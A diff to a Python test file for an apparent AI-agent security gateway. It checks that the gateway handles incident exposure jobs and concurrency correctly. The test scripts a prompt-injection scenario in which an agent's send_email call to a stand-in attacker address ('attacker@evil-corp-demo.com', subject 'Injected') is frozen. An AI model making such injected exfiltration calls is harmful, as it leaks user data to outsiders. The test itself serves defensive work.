@@ -13,6 +13,7 @@ from fastapi.testclient import TestClient
 
 from contracts.models import ExposureJob
 from engine.api import exposure as api
+from engine.api import server
 from engine.detonation import jobs, snapshot
 from engine.gateway import gate
 from engine.store import events
@@ -142,31 +143,103 @@ def test_replay_router_never_executes_or_reads_live_receipts(client, monkeypatch
 
 
 def test_exposure_shares_queue_and_reset_exclusion_with_other_incidents(client, monkeypatch):
+    """Scripted queue concurrency is separate from the accepted model-backed sibling proof."""
+    monkeypatch.setattr(server, "REPLAY", None)
+    monkeypatch.setattr(server, "_live_epoch", None)
+    monkeypatch.setattr(gate, "runs", {})
+    http = TestClient(server.app)
+    spec = {"name": "assistant", "owner": "synthetic operator",
+            "tools": ["read_calendar", "send_email"],
+            "allow": {"tools": ["read_calendar", "send_email"],
+                      "email_to": ["operator@synthetic.example"]},
+            "entrypoint": "sibling_probe:run"}
+    assert http.post("/agents", json=spec).status_code == 200
+
+    def start(name):
+        response = http.post("/runs", json={"agent": name, "task": f"Synthetic task for {name}"})
+        assert response.status_code == 200, response.text
+        body = response.json()
+        return body["run_id"], {"Authorization": f"Bearer {body['run_token']}"}
+
+    def check(run_id, auth, tool, args):
+        response = http.post("/gateway/check", headers=auth,
+                             json={"run_id": run_id, "tool": tool, "args": args})
+        assert response.status_code == 200, response.text
+        return response.json()
+
+    frozen_id, frozen_auth = start(spec["name"])
+    read = check(frozen_id, frozen_auth, "read_calendar", {"day": "2026-10-12"})
+    assert read["decision"] == "allow"
+    recorded = snapshot.load("inc_original")["tool_results"][0]["result"]
+    assert http.post(f"/runs/{frozen_id}/tool-results", headers=frozen_auth, json={
+        "call_id": read["call_id"], "tool": "read_calendar", "result": recorded}).status_code == 204
+    assert check(frozen_id, frozen_auth, "send_email", {
+        "to": "attacker@evil-corp-demo.com", "subject": "Injected", "body": "Synthetic rows"
+    })["decision"] == "freeze"
+    incident_id = gate.runs[frozen_id].incident_id
+    # Seed an existing proven verdict/cause; this test exercises concurrency, not detonation.
+    events.emit("verdict.ready", {"incident_id": incident_id, "confirmed": True,
+                "compromised_runs": "1/1", "policies_violated": ["P1"],
+                "blast_radius": {"records": 1, "recipients": ["attacker@evil-corp-demo.com"],
+                                 "secrets": [], "summary": "Synthetic existing proof"}},
+                incident_id=incident_id, env="mirage")
+    events.emit("bisection.completed", {"cause_input_id": "in_01"},
+                incident_id=incident_id, env="mirage")
+    original_incident = http.get(f"/incidents/{incident_id}").json()
+    original_snapshot = (snapshot.SNAP_DIR / f"{incident_id}.json").read_bytes()
+    assert http.post("/agents", json={**spec, "name": "healthy"}).status_code == 200
+    healthy_id, healthy_auth = start("healthy")
+
     started, release = threading.Event(), threading.Event()
     def hold(_):
         started.set()
-        assert release.wait(5)
+        assert release.wait(10)
     jobs.submit("inc_other", hold)
     assert started.wait(2)
-    calls = []
-    original = api.exposure.evaluate
-    monkeypatch.setattr(api.exposure, "evaluate", lambda *args: calls.append(args) or original(*args))
+    replay_started, replay_release = threading.Event(), threading.Event()
+    original = api.exposure.sandbox.run_once
+    def hold_replay(*args, **kwargs):
+        replay_started.set()
+        assert replay_release.wait(10)
+        return original(*args, **kwargs)
+    monkeypatch.setattr(api.exposure.sandbox, "run_once", hold_replay)
     try:
-        created = request(client)
+        created = http.post(f"/incidents/{incident_id}/exposure-jobs", json={
+            "agent_names": [client[2]["agent_name"], "invoice"],
+            "actor": "synthetic operator", "reason": "Scripted healthy-run concurrency"})
         assert created.status_code == 202 and created.json()["status"] == "queued"
-        assert calls == []
+        assert not replay_started.is_set()
         # The gateway's shared lock remains available while the other sandbox is running.
         assert jobs.lock.acquire(blocking=False)
         jobs.lock.release()
         with pytest.raises(jobs.Busy), jobs.resetting():
             pytest.fail("Reset entered during active sandbox work")
+        release.set()
+        assert replay_started.wait(3)
+        assert http.get(f"/exposure-jobs/{created.json()['id']}").json()["status"] == "running"
+        assert http.get(f"/runs/{healthy_id}").json()["status"] == "running"
+        decision = check(healthy_id, healthy_auth, "read_calendar", {"day": "2026-10-13"})
+        assert decision["decision"] == "allow"
+        assert http.post(f"/runs/{healthy_id}/tool-results", headers=healthy_auth, json={
+            "call_id": decision["call_id"], "tool": "read_calendar",
+            "result": {"events": []}}).status_code == 204
+        assert gate.runs[healthy_id].tool_results[0]["args"] == {"day": "2026-10-13"}
+        assert http.post(f"/runs/{healthy_id}/complete", headers=healthy_auth).json()["status"] == "completed"
+        assert http.get(f"/runs/{frozen_id}").json()["status"] == "frozen"
+        assert http.get(f"/incidents/{incident_id}").json() == original_incident
+        assert (snapshot.SNAP_DIR / f"{incident_id}.json").read_bytes() == original_snapshot
     finally:
         release.set()
+        replay_release.set()
     jobs.shutdown()
     history = events.read()
-    own = [e for e in history if e.incident_id == "inc_original"]
+    own = [e for e in history if e.incident_id == incident_id and "exposure_job" in e.payload]
+    assert own
     assert not any("sandbox_job" in e.payload or e.type.startswith("detonation.") for e in own)
-    final = client[0].get(f"/exposure-jobs/{created.json()['id']}").json()
-    assert final["status"] in ("completed", "failed")
-    if final["status"] == "failed":
-        assert final["error"] == "interrupted"
+    final = http.get(f"/exposure-jobs/{created.json()['id']}").json()
+    assert final["status"] == "completed", final
+    assert [r["status"] for r in final["results"]] == ["vulnerable", "not_applicable"]
+    assert final["results"][0]["replay_kind"] == "scripted"
+    assert http.get(f"/incidents/{incident_id}").json() == original_incident
+    assert http.get(f"/runs/{frozen_id}").json()["status"] == "frozen"
+    assert (snapshot.SNAP_DIR / f"{incident_id}.json").read_bytes() == original_snapshot
